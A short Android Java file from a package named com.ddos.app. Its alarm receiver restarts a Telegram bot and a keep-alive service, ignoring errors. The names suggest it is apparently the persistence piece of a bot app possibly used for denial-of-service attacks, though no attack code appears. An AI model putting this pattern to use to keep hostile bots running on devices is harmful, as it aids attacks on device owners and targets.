package com.ddos.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class AlarmReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        try {
            TelegramBot.start(ctx);
            Intent ka = new Intent(ctx, KeepAliveService.class);
            if (android.os.Build.VERSION.SDK_INT >= 26)
                ctx.startForegroundService(ka);
            else
                ctx.startService(ka);
        } catch (Exception ignored) {}
    }
}
